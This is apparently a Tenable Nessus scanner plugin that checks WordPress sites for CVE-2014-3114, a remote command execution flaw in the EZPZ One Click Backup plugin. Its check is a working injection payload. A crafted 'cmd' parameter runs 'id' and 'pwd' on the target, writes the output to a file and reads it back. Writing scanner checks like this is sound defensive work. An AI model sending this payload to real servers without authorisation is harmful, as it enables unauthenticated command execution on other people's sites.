#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(74108);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2016/12/09 20:35:28 $");

  script_cve_id("CVE-2014-3114");
  script_osvdb_id(106511);

  script_name(english:"EZPZ One Click Backup Plugin for WordPress 'cmd' Parameter Remote Command Execution");
  script_summary(english:"Attempts to run an arbitrary command.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by an
arbitrary command execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The EZPZ One Click Backup Plugin for WordPress installed on the remote
host is affected by a remote command execution vulnerability due to a
failure to properly sanitize user-supplied input to the 'cmd'
parameter in the ezpz-archive-cmd.php script. An unauthenticated,
remote attacker can exploit this issue to execute arbitrary commands
on the remote host, subject to the privileges of the web server user.");
  script_set_attribute(attribute:"see_also", value:"http://www.openwall.com/lists/oss-security/2014/05/01/11");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time. Development of the EZPZ plugin was reportedly
discontinued as of 4/27/2012.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/05/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/05/20");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2016 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "EZPZ One Click Backup";
url = "/wp-content/plugins/ezpz-one-click-backup/";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('\\.ezpz-title');
  checks[url + "ezpz-ocb.css"] = regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# EZPZ OCB is not compatible with Windows servers.
# Ref: http://wordpress.org/support/plugin/ezpz-one-click-backup
cmd = "id";
cmd_pats = "uid=[0-9]+.*gid=[0-9]+.*";

token = (SCRIPT_NAME - ".nasl") + "-" + unixtime() + ".txt";
vuln = FALSE;

attack = cmd + "|tee%20" + token + ";pwd>>" + token;
attack_url = url + "functions/ezpz-archive-cmd.php?cmd=" + attack;

# Attempt exploit
res2 = http_send_recv3(
  method    : "GET",
  item      : dir + attack_url,
  port         : port,
  exit_on_fail : TRUE
);

# Try accessing the file we created with our cmd output
file_path = url + "functions/" + token;
res2 = http_send_recv3(
  method       : "GET",
  item         : dir + file_path,
  port         : port,
   exit_on_fail : TRUE
);
output = res2[2];

if (egrep(pattern:cmd_pats, string:output))
{
  vuln = TRUE;
  get_up_path = "" + token;

  # Extract path for reporting
  get_path = strstr(output, "/");
  get_up_path = chomp(get_path) + "/" + token;
  output = strstr(output, "uid") - get_path;
}

if (!vuln)
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");

extra = 'Note: This file has not been removed by Nessus and will need to be' +
        '\n' + 'manually deleted (' + get_up_path + ').';

security_report_v4(
  port        : port,
  severity    : SECURITY_HOLE,
  cmd         : cmd,
  line_limit  : 2,
  request     : make_list(install_url + attack_url, install_url + file_path),
  output      : chomp(output),
  rep_extra   : extra
);
exit(0);
